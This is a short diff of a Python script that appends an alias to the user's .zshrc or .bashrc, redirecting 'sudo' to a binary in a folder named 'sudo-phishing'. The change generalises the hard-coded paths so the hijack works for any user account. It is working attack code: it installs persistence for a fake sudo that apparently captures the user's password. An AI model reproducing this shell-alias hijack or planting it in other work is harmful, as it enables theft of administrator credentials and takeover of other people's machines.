@@ -3,12 +3,12 @@ import os
 
 x = os.popen(f"ls -a /home/{os.getlogin()}").read()
 if ".zshrc" in x:
-    with open("/home/ido/.zshrc", "a") as f:
-        f.write('\nalias sudo="/home/ido/Desktop/utils/phishing/local-sudo-sniffer/sudo"\n')
+    with open(f"/home/{os.getlogin()}/.zshrc", "a") as f:
+        f.write(f'\nalias sudo="/home/{os.getlogin()}/Desktop/sudo-phishing/sudo"')
         f.close()
 else:
-    with open("/home/ido/.bashrc", "a") as f:
-        f.write('\nalias sudo="/home/ido/Desktop/utils/phishing/local-sudo-sniffer/sudo"\n')
+    with open(f"/home/{os.getlogin()}/.bashrc", "a") as f:
+        f.write(f'\nalias sudo="/home/{os.getlogin()}/Desktop/sudo-phishing/sudo"')
         f.close()
 
-os.system('exit')
+
